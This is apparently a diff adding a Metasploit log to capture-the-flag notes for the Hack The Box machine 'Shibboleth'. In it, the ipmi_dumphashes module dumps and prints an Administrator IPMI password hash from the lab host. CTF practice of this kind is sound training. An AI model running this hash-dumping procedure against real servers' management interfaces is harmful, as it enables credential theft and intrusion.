@@ -98,3 +98,56 @@ Filtered Requests: 4986
 Requests/sec.: 56.54829
 
 
+msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show actions
+
+Auxiliary actions:
+
+   Name  Description
+   ----  -----------
+
+
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > options
+
+Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):
+
+   Name                  Current Setting                                                    Required  Description
+   ----                  ---------------                                                    --------  -----------
+   CRACK_COMMON          true                                                               yes       Automatically crack common passwords as they are obtained
+   OUTPUT_HASHCAT_FILE                                                                      no        Save captured password hashes in hashcat format
+   OUTPUT_JOHN_FILE                                                                         no        Save captured password hashes in john the ripper format
+   PASS_FILE             /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
+   RHOSTS                                                                                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT                 623                                                                yes       The target port
+   SESSION_MAX_ATTEMPTS  5                                                                  yes       Maximum number of session retries, required on certain BMCs (HP iLO 4, etc)
+   SESSION_RETRY_DELAY   5                                                                  yes       Delay between session retries in seconds
+   THREADS               1                                                                  yes       The number of concurrent threads (max one per host)
+   USER_FILE             /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line
+
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set RHOSTS shibboleth.htb
+RHOSTS => shibboleth.htb
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set threads 10
+threads => 10
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > options
+
+Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):
+
+   Name                  Current Setting                                                    Required  Description
+   ----                  ---------------                                                    --------  -----------
+   CRACK_COMMON          true                                                               yes       Automatically crack common passwords as they are obtained
+   OUTPUT_HASHCAT_FILE                                                                      no        Save captured password hashes in hashcat format
+   OUTPUT_JOHN_FILE                                                                         no        Save captured password hashes in john the ripper format
+   PASS_FILE             /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
+   RHOSTS                shibboleth.htb                                                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT                 623                                                                yes       The target port
+   SESSION_MAX_ATTEMPTS  5                                                                  yes       Maximum number of session retries, required on certain BMCs (HP iLO 4, etc)
+   SESSION_RETRY_DELAY   5                                                                  yes       Delay between session retries in seconds
+   THREADS               10                                                                 yes       The number of concurrent threads (max one per host)
+   USER_FILE             /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line
+
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
+
+[+] 10.129.228.134:623 - IPMI - Hash found: Administrator:5fc848fa820100002eeb192a99e29bd979c53735eadc040ebd88ff2ec56657f8fb461961e0bd8a1ea123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:828b49d276eb4edfc57cbebdd63a8e89c9765a41
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) 
